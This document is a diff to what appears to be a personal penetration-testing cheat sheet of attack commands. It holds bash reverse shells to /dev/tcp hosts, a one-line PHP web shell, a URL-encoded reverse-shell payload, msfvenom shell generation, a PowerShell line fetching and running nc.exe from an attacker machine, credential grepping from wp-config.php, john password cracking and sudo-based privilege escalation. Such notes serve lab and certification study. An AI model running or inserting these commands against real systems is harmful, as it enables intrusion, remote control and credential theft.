@@ -25,6 +25,7 @@ $ find / -group filter 2>dev/null
 $ echo $PATH
 $ pwd && conncheck
 $ screen -v
+$ pspy
 
 * Credential Hunting
 $ cat wp-config.php | grep 'DB_USER\|DB_PASSWORD'
@@ -34,9 +35,9 @@ $ ls `/.ssh
 $ gcc shell.c -o shell
 
 * Sample bash reverse shell:
-$ bash -i >& /dev/tcp/192.168.45.204/443 0>&1
+$ bash -i >& /dev/tcp/<IP>/443 0>&1
 $ <?php system($_GET["cmd"]); ?>'
-$ 0=/bin/bash+-c+%27bash+-i+%3E%26+/dev/tcp/192.168.45.162/80+0%3E%261%27
+$ 0=/bin/bash+-c+%27bash+-i+%3E%26+/dev/tcp/<IP>/80+0%3E%261%27
 
 * if you founf more domain or ip addresses, add to dns -> /etc/hosts
 
@@ -63,6 +64,10 @@ chmod +x binary
 sudo /usr/local/bin/exiftool -filename=/usr/bin/app (binary path)
 sudo /usr/bin/app
 
+*zip2john
+$ zip2john file.zip > file
+$ john --wordlist=rockyou file
+
 * generate shell
 msfvenom -p linux/x64/shell_reverse_tcp LHOST=urip LPORT=4444 -f elf -o shell.elf
 
@@ -74,6 +79,9 @@ powershell -c iwr http://ipkali/nc.exe -OutFile \windows\temp\nc.exe;windows\tem
 
 * generate reverse shell
 https://github.com/pentestmonkey/php-reverse-shell
+
+*check anomali file:
+configuration.file
 
 * example privesc:
 /usr/bin/dstat create file py
